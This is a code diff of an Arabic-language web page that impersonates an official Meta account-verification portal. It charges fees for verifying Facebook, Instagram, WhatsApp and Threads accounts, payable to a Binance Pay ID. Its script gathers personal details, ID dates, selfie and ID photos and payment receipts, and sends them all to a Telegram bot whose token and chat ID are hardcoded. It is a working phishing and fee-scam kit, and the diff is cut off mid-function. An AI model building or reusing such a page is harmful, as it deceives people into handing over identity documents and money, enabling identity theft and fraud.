@@ -11,260 +11,282 @@
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Cairo', sans-serif; }
-        .gradient-text {
-            background: linear-gradient(90deg, #0668E1, #E1306C);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        body { font-family: 'Cairo', sans-serif; background-color: #f3f4f6; }
+        .fade-in { animation: fadeIn 0.4s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="bg-gray-100 min-h-screen pb-10">
+<body class="min-h-screen pb-10">
 
     <!-- Header -->
-    <header class="bg-white shadow-md mb-8">
+    <header class="bg-white shadow-sm mb-8 sticky top-0 z-50">
         <div class="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">
-            <div class="flex items-center gap-2">
+            <div class="flex items-center gap-3">
                 <i class="fa-brands fa-meta text-3xl text-blue-600"></i>
                 <h1 class="text-2xl font-bold text-gray-800" id="pageTitle">بوابة التوثيق الرسمية</h1>
             </div>
-            <button onclick="toggleLanguage()" class="bg-blue-50 text-blue-600 px-4 py-2 rounded-lg font-semibold hover:bg-blue-100 transition">
-                <i class="fa-solid fa-globe"></i> <span id="langBtn">English</span>
-            </button>
         </div>
     </header>
 
-    <!-- Main Form -->
     <main class="max-w-4xl mx-auto px-4">
-        <form id="verificationForm" class="bg-white rounded-2xl shadow-lg p-6 md:p-8 space-y-8">
-            
-            <!-- Personal Info Section -->
-            <div>
-                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec1Title"><i class="fa-solid fa-user-check text-blue-500 ml-2"></i>المعلومات الشخصية</h2>
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblArName">الاسم بالعربي</label>
-                        <input type="text" id="arName" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblEnName">الاسم بالإنجليزي</label>
-                        <input type="text" id="enName" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none text-left" dir="ltr">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblNationality">الجنسية</label>
-                        <input type="text" id="nationality" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblEmail">الإيميل الخاص بك</label>
-                        <input type="email" id="email" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none text-left" dir="ltr">
-                    </div>
-                    <div class="md:col-span-2">
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblLocation">موقع السكن الحالي</label>
-                        <input type="text" id="location" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                    </div>
-                </div>
+        
+        <!-- ================= STEP 1: Main Form ================= -->
+        <div id="step1" class="fade-in bg-white rounded-2xl shadow-lg p-6 md:p-8">
+            <div class="mb-6 flex justify-between items-center border-b pb-4">
+                <h2 class="text-xl font-bold text-gray-700"><i class="fa-solid fa-file-pen text-blue-500 ml-2"></i>الخطوة 1: تعبئة البيانات</h2>
             </div>
-
-            <!-- Identity Section -->
-            <div>
-                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec2Title"><i class="fa-solid fa-id-card text-blue-500 ml-2"></i>معلومات الهوية</h2>
+            
+            <form id="verificationForm" class="space-y-8">
+                <!-- Personal Info -->
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIdType">نوع الهوية</label>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">الاسم بالعربي</label><input type="text" id="arName" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none"></div>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">الاسم بالإنجليزي</label><input type="text" id="enName" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none text-left" dir="ltr"></div>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">الجنسية</label><input type="text" id="nationality" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none"></div>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">الإيميل</label><input type="email" id="email" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none text-left" dir="ltr"></div>
+                    <div class="md:col-span-2"><label class="block text-sm font-semibold text-gray-600 mb-1">موقع السكن الحالي</label><input type="text" id="location" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none"></div>
+                </div>
+
+                <!-- Identity Info -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-gray-50 p-4 rounded-xl">
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">نوع الهوية</label>
                         <select id="idType" class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                            <option value="بطاقة شخصية" id="optId">بطاقة شخصية</option>
-                            <option value="جواز سفر" id="optPassport">جواز سفر</option>
+                            <option value="بطاقة شخصية">بطاقة شخصية</option>
+                            <option value="جواز سفر">جواز سفر</option>
                         </select>
                     </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblDob">تاريخ الميلاد</label>
-                        <input type="date" id="dob" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIdIssue">تاريخ إصدار الهوية</label>
-                        <input type="date" id="idIssue" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIdExpiry">تاريخ انتهاء الهوية</label>
-                        <input type="date" id="idExpiry" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
-                    </div>
-                </div>
-            </div>
-
-            <!-- Platforms & Links Section -->
-            <div>
-                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec3Title"><i class="fa-solid fa-link text-blue-500 ml-2"></i>الحسابات والروابط</h2>
-                
-                <label class="block text-sm font-semibold text-gray-600 mb-2" id="lblPlatforms">اختر الحسابات المراد توثيقها (مع الرسوم الشهرية)</label>
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
-                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
-                        <input type="checkbox" name="platform" value="فيسبوك (10$)" class="w-5 h-5 text-blue-600 rounded">
-                        <i class="fa-brands fa-facebook text-blue-600 text-xl"></i> <span class="font-semibold">فيسبوك (10$)</span>
-                    </label>
-                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
-                        <input type="checkbox" name="platform" value="انستجرام (10$)" class="w-5 h-5 text-pink-600 rounded">
-                        <i class="fa-brands fa-instagram text-pink-600 text-xl"></i> <span class="font-semibold">انستجرام (10$)</span>
-                    </label>
-                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
-                        <input type="checkbox" name="platform" value="واتساب رسمي (10$)" class="w-5 h-5 text-green-500 rounded">
-                        <i class="fa-brands fa-whatsapp text-green-500 text-xl"></i> <span class="font-semibold">واتساب رسمي (10$)</span>
-                    </label>
-                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
-                        <input type="checkbox" name="platform" value="واتساب أعمال (20$)" class="w-5 h-5 text-green-600 rounded">
-                        <i class="fa-brands fa-whatsapp text-green-600 text-xl"></i> <span class="font-semibold">واتساب أعمال (20$)</span>
-                    </label>
-                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
-                        <input type="checkbox" name="platform" value="ثريدز (10$)" class="w-5 h-5 text-black rounded">
-                        <i class="fa-brands fa-threads text-black text-xl"></i> <span class="font-semibold">ثريدز (10$)</span>
-                    </label>
-                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
-                        <input type="checkbox" name="platform" value="حساب ميتا الرسمي (20$)" class="w-5 h-5 text-blue-800 rounded">
-                        <i class="fa-brands fa-meta text-blue-800 text-xl"></i> <span class="font-semibold">ميتا الرسمي (20$)</span>
-                    </label>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">تاريخ الميلاد</label><input type="date" id="dob" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none"></div>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">تاريخ إصدار الهوية</label><input type="date" id="idIssue" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none"></div>
+                    <div><label class="block text-sm font-semibold text-gray-600 mb-1">تاريخ انتهاء الهوية</label><input type="date" id="idExpiry" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none"></div>
                 </div>
 
+                <!-- Platforms & Links -->
+                <div>
+                    <label class="block text-sm font-bold text-gray-800 mb-3 border-b pb-2">اختر الحسابات المراد توثيقها</label>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
+                        <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-100 transition"><input type="checkbox" name="platform" value="فيسبوك" data-price="10" class="w-5 h-5 rounded platform-cb"><i class="fa-brands fa-facebook text-blue-600 text-xl"></i> <span>فيسبوك (10$)</span></label>
+                        <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-100 transition"><input type="checkbox" name="platform" value="انستجرام" data-price="10" class="w-5 h-5 rounded platform-cb"><i class="fa-brands fa-instagram text-pink-600 text-xl"></i> <span>انستجرام (10$)</span></label>
+                        <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-100 transition"><input type="checkbox" name="platform" value="واتساب رسمي" data-price="10" class="w-5 h-5 rounded platform-cb"><i class="fa-brands fa-whatsapp text-green-500 text-xl"></i> <span>واتساب رسمي (10$)</span></label>
+                        <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-100 transition"><input type="checkbox" name="platform" value="واتساب أعمال" data-price="20" class="w-5 h-5 rounded platform-cb"><i class="fa-brands fa-whatsapp text-green-700 text-xl"></i> <span>واتساب أعمال (20$)</span></label>
+                        <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-100 transition"><input type="checkbox" name="platform" value="ثريدز" data-price="10" class="w-5 h-5 rounded platform-cb"><i class="fa-brands fa-threads text-black text-xl"></i> <span>ثريدز (10$)</span></label>
+                        <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-100 transition"><input type="checkbox" name="platform" value="ميتا الرسمي" data-price="20" class="w-5 h-5 rounded platform-cb"><i class="fa-brands fa-meta text-blue-800 text-xl"></i> <span>ميتا الرسمي (20$)</span></label>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div><label class="block text-sm font-semibold text-gray-600 mb-1">رابط الفيسبوك</label><input type="url" id="fbLink" class="w-full border rounded-lg p-3 text-left outline-none" dir="ltr"></div>
+                        <div><label class="block text-sm font-semibold text-gray-600 mb-1">رابط الانستجرام</label><input type="url" id="igLink" class="w-full border rounded-lg p-3 text-left outline-none" dir="ltr"></div>
+                        <div><label class="block text-sm font-semibold text-gray-600 mb-1">رقم الواتساب</label><input type="text" id="waLink" required class="w-full border rounded-lg p-3 text-left outline-none" dir="ltr" placeholder="+967..."></div>
+                        <div><label class="block text-sm font-semibold text-gray-600 mb-1">رابط الثريدز</label><input type="url" id="thLink" class="w-full border rounded-lg p-3 text-left outline-none" dir="ltr"></div>
+                    </div>
+                </div>
+
+                <!-- Attachments -->
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblFbLink">رابط الفيسبوك</label>
-                        <input type="url" id="fbLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="https://facebook.com/...">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIgLink">رابط الانستجرام</label>
-                        <input type="url" id="igLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="https://instagram.com/...">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblWaLink">رقم الواتساب (مع الرمز الدولي)</label>
-                        <input type="text" id="waLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="+967...">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblThLink">رابط الثريدز</label>
-                        <input type="url" id="thLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="https://threads.net/...">
-                    </div>
+                    <div class="border-2 border-dashed border-gray-300 rounded-xl p-4 text-center bg-gray-50"><label class="block font-semibold mb-2 cursor-pointer">صورة سيلفي لك</label><input type="file" id="selfiePhoto" accept="image/*" required class="w-full text-sm"></div>
+                    <div class="border-2 border-dashed border-gray-300 rounded-xl p-4 text-center bg-gray-50"><label class="block font-semibold mb-2 cursor-pointer">صورة الهوية</label><input type="file" id="idPhoto" accept="image/*" required class="w-full text-sm"></div>
+                </div>
+
+                <div class="bg-blue-50 p-4 rounded-xl flex justify-between items-center">
+                    <span class="font-bold text-gray-700">الإجمالي المستحق:</span>
+                    <span id="totalPriceDisplay" class="text-2xl font-bold text-blue-600">0$</span>
+                </div>
+
+                <button type="submit" class="w-full bg-gray-900 hover:bg-black text-white font-bold py-4 rounded-xl shadow-lg transition duration-300">
+                    إنشاء الفاتورة والمتابعة للدفع <i class="fa-solid fa-arrow-left mr-2"></i>
+                </button>
+            </form>
+        </div>
+
+        <!-- ================= STEP 2: Payment & Verification ================= -->
+        <div id="step2" class="fade-in bg-white rounded-2xl shadow-lg p-6 md:p-8 hidden">
+            
+            <!-- Invoice Details -->
+            <div class="bg-gradient-to-r from-gray-900 to-gray-800 rounded-2xl p-6 text-white mb-8 text-center shadow-md relative overflow-hidden">
+                <i class="fa-solid fa-file-invoice-dollar text-6xl opacity-10 absolute -right-4 -bottom-4"></i>
+                <h3 class="text-lg text-gray-300 mb-2">تم إنشاء طلبك بنجاح</h3>
+                <p class="text-sm text-gray-400 mb-1">كود الفاتورة الخاص بك:</p>
+                <div class="text-3xl font-bold tracking-widest text-yellow-400 mb-4 select-all cursor-pointer" id="displayInvoiceCode"></div>
+                <div class="text-xl">الإجمالي المطلوب: <span id="displayTotal" class="font-bold text-green-400"></span></div>
+            </div>
+
+            <!-- Payment Info -->
+            <div class="border border-yellow-300 bg-yellow-50 rounded-xl p-5 mb-8 flex items-center gap-4">
+                <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="Binance" class="w-12 h-12">
+                <div>
+                    <h4 class="font-bold text-gray-800">طريقة الدفع: Binance Pay</h4>
+                    <p class="text-gray-600 text-sm">يرجى تحويل المبلغ الموضح أعلاه إلى رقم الحساب (Pay ID) التالي:</p>
+                    <div class="font-mono text-xl font-bold text-gray-900 mt-1 select-all cursor-pointer">477007114</div>
                 </div>
             </div>
 
-            <!-- Attachments Section -->
-            <div>
-                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec4Title"><i class="fa-solid fa-file-arrow-up text-blue-500 ml-2"></i>المرفقات</h2>
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition">
-                        <i class="fa-solid fa-camera text-3xl text-gray-400 mb-2"></i>
-                        <label class="block text-sm font-semibold text-gray-600 mb-2 cursor-pointer" id="lblSelfie">صورة سيلفي لك</label>
-                        <input type="file" id="selfiePhoto" accept="image/*" required class="w-full text-sm">
-                    </div>
-                    <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition">
-                        <i class="fa-solid fa-id-card-clip text-3xl text-gray-400 mb-2"></i>
-                        <label class="block text-sm font-semibold text-gray-600 mb-2 cursor-pointer" id="lblIdPhoto">صورة الهوية</label>
-                        <input type="file" id="idPhoto" accept="image/*" required class="w-full text-sm">
-                    </div>
+            <!-- Verify Code to unlock File Upload -->
+            <div class="border-t pt-8">
+                <h3 class="text-lg font-bold text-gray-800 mb-4"><i class="fa-solid fa-magnifying-glass text-blue-500 ml-2"></i>أدخل كود الفاتورة لتأكيد الدفع</h3>
+                <div class="flex gap-2 mb-6">
+                    <input type="text" id="verifyCodeInput" placeholder="مثال: INV-12345" class="w-full border-2 border-gray-300 rounded-xl p-3 text-center text-lg font-bold uppercase tracking-wide focus:border-blue-500 outline-none dir-ltr">
+                    <button id="btnVerifyCode" class="bg-blue-600 hover:bg-blue-700 text-white px-6 rounded-xl font-bold transition whitespace-nowrap">جلب البيانات</button>
                 </div>
+                <p id="verifyError" class="text-red-500 text-sm font-bold hidden text-center">الكود غير صحيح، يرجى التأكد.</p>
             </div>
 
-            <!-- Submit Button -->
-            <button type="submit" id="submitBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg transition duration-300 flex justify-center items-center gap-2">
-                <i class="fa-solid fa-paper-plane"></i> <span id="btnText">إرسال طلب التوثيق</span>
-            </button>
-            <p id="loadingMsg" class="text-center text-blue-600 font-bold hidden">جاري الإرسال، يرجى الانتظار...</p>
-        </form>
+            <!-- Summary & Receipt Upload (Hidden until verified) -->
+            <div id="summarySection" class="hidden fade-in bg-gray-50 border rounded-xl p-6 mt-4">
+                <div class="flex items-center gap-3 mb-4 border-b pb-3">
+                    <div class="bg-green-100 text-green-600 p-2 rounded-full"><i class="fa-solid fa-check"></i></div>
+                    <h4 class="font-bold text-gray-800">تم العثور على بيانات الفاتورة</h4>
+                </div>
+                <div class="grid grid-cols-2 gap-4 text-sm mb-6">
+                    <div><span class="text-gray-500 block">الاسم:</span><span id="sumName" class="font-bold text-gray-800"></span></div>
+                    <div><span class="text-gray-500 block">رقم الواتساب:</span><span id="sumPhone" class="font-bold text-gray-800" dir="ltr"></span></div>
+                    <div class="col-span-2"><span class="text-gray-500 block">السكن:</span><span id="sumLocation" class="font-bold text-gray-800"></span></div>
+                </div>
+
+                <div class="border-2 border-blue-400 border-dashed rounded-xl p-5 text-center bg-white mb-6">
+                    <i class="fa-solid fa-receipt text-3xl text-blue-500 mb-2"></i>
+                    <label class="block font-bold text-gray-700 mb-2">ارفع صورة سند الإشعار (تحويل Binance)</label>
+                    <input type="file" id="receiptPhoto" accept="image/*" class="w-full text-sm">
+                </div>
+
+                <button id="finalSubmitBtn" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl shadow-lg transition duration-300 text-lg flex justify-center items-center gap-2">
+                    <i class="fa-solid fa-check-double"></i> <span>تأكيد وإرسال الطلب للإدارة</span>
+                </button>
+                <p id="loadingMsg" class="text-center text-blue-600 font-bold hidden mt-3">جاري إرسال البيانات والصور، يرجى الانتظار...</p>
+            </div>
+        </div>
+        
     </main>
 
-    <!-- JavaScript -->
     <script>
-        // إعدادات البوت الخاص بك
+        // إعدادات البوت 
         const BOT_TOKEN = '8868584934:AAE0jkikO04FtbUbRh8jrwR3ComrJ3md_ho';
         const CHAT_ID = '8868584934';
 
-        // نظام اللغات
-        let currentLang = 'ar';
-        const translations = {
-            ar: {
-                pageTitle: "بوابة التوثيق الرسمية", langBtn: "English",
-                sec1Title: "المعلومات الشخصية", lblArName: "الاسم بالعربي", lblEnName: "الاسم بالإنجليزي", lblNationality: "الجنسية", lblEmail: "الإيميل الخاص بك", lblLocation: "موقع السكن الحالي",
-                sec2Title: "معلومات الهوية", lblIdType: "نوع الهوية", optId: "بطاقة شخصية", optPassport: "جواز سفر", lblDob: "تاريخ الميلاد", lblIdIssue: "تاريخ إصدار الهوية", lblIdExpiry: "تاريخ انتهاء الهوية",
-                sec3Title: "الحسابات والروابط", lblPlatforms: "اختر الحسابات المراد توثيقها (مع الرسوم الشهرية)", lblFbLink: "رابط الفيسبوك", lblIgLink: "رابط الانستجرام", lblWaLink: "رقم الواتساب", lblThLink: "رابط الثريدز",
-                sec4Title: "المرفقات", lblSelfie: "صورة سيلفي لك", lblIdPhoto: "صورة الهوية",
-                btnText: "إرسال طلب التوثيق", loadingMsg: "جاري الإرسال، يرجى الانتظار...", successMsg: "تم إرسال طلبك بنجاح!"
-            },
-            en: {
-                pageTitle: "Meta Verification Portal", langBtn: "العربية",
-                sec1Title: "Personal Information", lblArName: "Name in Arabic", lblEnName: "Name in English", lblNationality: "Nationality", lblEmail: "Your Email", lblLocation: "Current Residence",
-                sec2Title: "Identity Details", lblIdType: "ID Type", optId: "National ID", optPassport: "Passport", lblDob: "Date of Birth", lblIdIssue: "ID Issue Date", lblIdExpiry: "ID Expiry Date",
-                sec3Title: "Accounts & Links", lblPlatforms: "Select Platforms for Verification (Monthly Fees)", lblFbLink: "Facebook Link", lblIgLink: "Instagram Link", lblWaLink: "WhatsApp Number", lblThLink: "Threads Link",
-                sec4Title: "Attachments", lblSelfie: "Selfie Photo", lblIdPhoto: "ID Photo",
-                btnText: "Submit Application", loadingMsg: "Sending, please wait...", successMsg: "Your application has been submitted successfully!"
-            }
-        };
+        // متغير لحفظ بيانات الجلسة (لأننا في صفحة واحدة)
+        let appData = {};
 
-        function toggleLanguage() {
-            currentLang = currentLang === 'ar' ? 'en' : 'ar';
-            document.documentElement.lang = currentLang;
-            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
-            
-            for (const key in translations[currentLang]) {
-                const element = document.getElementById(key);
-                if (element) {
-                    if(element.tagName === 'INPUT' || element.tagName === 'SELECT') continue; 
-                    if(element.childNodes.length > 1) {
-                        element.lastChild.textContent = translations[currentLang][key];
-                    } else {
-                        element.textContent = translations[currentLang][key];
-                    }
-                }
-            }
+        // تحديث السعر الحي عند اختيار المنصات
+        const checkboxes = document.querySelectorAll('.platform-cb');
+        const priceDisplay = document.getElementById('totalPriceDisplay');
+        
+        function calculateTotal() {
+            let total = 0;
+            checkboxes.forEach(cb => { if(cb.checked) total += parseInt(cb.getAttribute('data-price')); });
+            priceDisplay.textContent = total + '$';
+            return total;
         }
+        checkboxes.forEach(cb => cb.addEventListener('change', calculateTotal));
 
-        // دالة الإرسال إلى تلجرام
-        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+        // عند إرسال النموذج (الخطوة 1)
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingMsg = document.getElementById('loadingMsg');
-            submitBtn.classList.add('hidden');
-            loadingMsg.classList.remove('hidden');
+            const total = calculateTotal();
+            if(total === 0) {
+                alert("يرجى اختيار منصة واحدة على الأقل لتوثيقها.");
+                return;
+            }
 
-            // تجميع الخيارات المحددة
-            const checkboxes = document.querySelectorAll('input[name="platform"]:checked');
+            // إنشاء كود فاتورة عشوائي
+            const invoiceCode = 'INV-' + Math.floor(10000 + Math.random() * 90000);
+            
+            // تجميع المنصات
             let selectedPlatforms = [];
-            checkboxes.forEach((cb) => { selectedPlatforms.push(cb.value); });
+            checkboxes.forEach((cb) => { if(cb.checked) selectedPlatforms.push(cb.value + ' ('+cb.getAttribute('data-price')+'$)'); });
 
-            // تنسيق الرسالة النصية
+            // تخزين البيانات مؤقتاً في الذاكرة (دون تحديث الصفحة)
+            appData = {
+                code: invoiceCode,
+                total: total,
+                arName: document.getElementById('arName').value,
+                enName: document.getElementById('enName').value,
+                nationality: document.getElementById('nationality').value,
+                location: document.getElementById('location').value,
+                email: document.getElementById('email').value,
+                idType: document.getElementById('idType').value,
+                dob: document.getElementById('dob').value,
+                idIssue: document.getElementById('idIssue').value,
+                idExpiry: document.getElementById('idExpiry').value,
+                waLink: document.getElementById('waLink').value,
+                fbLink: document.getElementById('fbLink').value,
+                igLink: document.getElementById('igLink').value,
+                thLink: document.getElementById('thLink').value,
+                platforms: selectedPlatforms
+            };
+
+            // عرض البيانات في الخطوة 2
+            document.getElementById('displayInvoiceCode').textContent = invoiceCode;
+            document.getElementById('displayTotal').textContent = total + '$';
+
+            // التبديل بين الخطوات
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+
+        // التحقق من كود الفاتورة لجلب البيانات (الخطوة 2)
+        document.getElementById('btnVerifyCode').addEventListener('click', function() {
+            const inputCode = document.getElementById('verifyCodeInput').value.trim().toUpperCase();
+            const errorMsg = document.getElementById('verifyError');
+            const summarySec = document.getElementById('summarySection');
+
+            if (inputCode === appData.code) {
+                errorMsg.classList.add('hidden');
+                // عرض ملخص البيانات
+                document.getElementById('sumName').textContent = appData.arName;
+                document.getElementById('sumPhone').textContent = appData.waLink;
+                document.getElementById('sumLocation').textContent = appData.location;
+                
+                summarySec.classList.remove('hidden');
+            } else {
+                errorMsg.classList.remove('hidden');
+                summarySec.classList.add('hidden');
+            }
+        });
+
+        // الإرسال النهائي للتليجرام
+        document.getElementById('finalSubmitBtn').addEventListener('click', async function() {
+            const receiptInput = document.getElementById('receiptPhoto');
+            if(receiptInput.files.length === 0) {
+                alert("يرجى إرفاق صورة سند الإشعار أولاً.");
+                return;
+            }
+
+            const btn = this;
+            const loading = document.getElementById('loadingMsg');
+            btn.classList.add('hidden');
+            loading.classList.remove('hidden');
+
+            // تجهيز نص الرسالة
             const messageText = `
-📌 *طلب توثيق جديد* 📌
-👤 الاسم بالعربي: ${document.getElementById('arName').value}
-🔤 الاسم بالإنجليزي: ${document.getElementById('enName').value}
-🌍 الجنسية: ${document.getElementById('nationality').value}
-📍 السكن: ${document.getElementById('location').value}
-📧 الإيميل: ${document.getElementById('email').value}
+✅ *طلب توثيق مدفوع جديد* ✅
+🧾 كود الفاتورة: \`${appData.code}\`
+💰 الإجمالي المدفوع: ${appData.total}$ (عبر Binance)
 
-🪪 *معلومات الهوية:*
-- النوع: ${document.getElementById('idType').value}
-- الميلاد: ${document.getElementById('dob').value}
-- الإصدار: ${document.getElementById('idIssue').value}
-- الانتهاء: ${document.getElementById('idExpiry').value}
+👤 الاسم: ${appData.arName} (${appData.enName})
+🌍 الجنسية: ${appData.nationality} |📍 السكن: ${appData.location}
+📧 الإيميل: ${appData.email}
+📞 الواتساب: ${appData.waLink}
 
-📱 *المنصات المطلوبة:*
-${selectedPlatforms.length > 0 ? selectedPlatforms.join('\n') : 'لم يتم تحديد منصات'}
+🪪 *الهوية:* (${appData.idType})
+مواليد: ${appData.dob} | إصدار: ${appData.idIssue} | انتهاء: ${appData.idExpiry}
+
+📱 *المنصات المطلوب توثيقها:*
+${appData.platforms.join('\n')}
 
 🔗 *الروابط:*
-- فيسبوك: ${document.getElementById('fbLink').value || 'لا يوجد'}
-- انستجرام: ${document.getElementById('igLink').value || 'لا يوجد'}
-- واتساب: ${document.getElementById('waLink').value || 'لا يوجد'}
-- ثريدز: ${document.getElementById('thLink').value || 'لا يوجد'}
+FB: ${appData.fbLink || '-'}
+IG: ${appData.igLink || '-'}
+TH: ${appData.thLink || '-'}
             `;
 
             try {
-                // 1. إرسال النص أولاً
+                // 1. إرسال النص
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: messageText,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' })
                 });
 
-                // 2. دالة لرفع الصور
+                // دالة مساعدة لرفع الصور
                 const sendPhoto = async (fileInputId, caption) => {
                     const file = document.getElementById(fileInputId).files[0];
                     if (file) {
@@ -272,25 +294,23 @@ ${selectedPlatforms.length > 0 ? selectedPlatforms.join('\n') : 'لم يتم ت�
                         formData.append('chat_id', CHAT_ID);
                         formData.append('document', file);
                         formData.append('caption', caption);
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
                     }
                 };
 
-                // إرسال السيلفي ثم الهوية
-                await sendPhoto('selfiePhoto', '📷 صورة السيلفي للمتقدم: ' + document.getElementById('arName').value);
-                await sendPhoto('idPhoto', '🪪 صورة هوية المتقدم');
+                // 2. إرسال الصور (تم الاحتفاظ بها في عناصر الـ input الأصلية لأننا لم نقم بتحديث الصفحة)
+                await sendPhoto('selfiePhoto', `📷 صورة السيلفي | فاتورة: ${appData.code}`);
+                await sendPhoto('idPhoto', `🪪 صورة الهوية | فاتورة: ${appData.code}`);
+                await sendPhoto('receiptPhoto', `🧾 سند الدفع (Binance) | فاتورة: ${appData.code}`);
 
-                alert(translations[currentLang].successMsg);
-                document.getElementById('verificationForm').reset();
+                alert("تم استلام طلبك وسند الدفع بنجاح. سيتم مراجعة الطلب والتواصل معك.");
+                location.reload(); // إعادة تحميل الصفحة للبدء من جديد
+                
             } catch (error) {
